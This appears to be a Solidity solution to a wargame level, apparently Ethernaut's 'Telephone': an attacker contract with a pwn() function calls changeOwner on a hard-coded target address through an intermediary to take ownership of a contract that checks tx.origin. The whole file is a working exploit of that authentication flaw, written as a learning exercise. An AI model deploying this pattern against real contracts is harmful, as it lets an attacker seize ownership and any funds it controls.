// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract NotTxOrigin {

    Telephone telephone = Telephone(0x53753e7ad186c48f593599F625665879d0F844d6);
    
    function pwn() public {
        telephone.changeOwner(msg.sender);
    }
}